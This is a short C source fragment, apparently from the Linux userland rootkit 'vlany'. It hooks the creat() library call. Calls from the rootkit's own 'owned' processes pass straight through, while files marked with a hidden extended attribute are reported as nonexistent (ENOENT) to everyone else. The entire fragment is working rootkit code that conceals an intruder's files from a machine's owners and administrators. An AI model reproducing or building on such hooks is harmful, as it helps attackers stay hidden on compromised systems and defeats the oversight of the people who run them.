int creat(const char *pathname, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] creat() called\n");
    #endif

    HOOK(old_creat, CCREAT);

    if(owned()) return old_creat(pathname, mode);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_creat(pathname, mode);
}
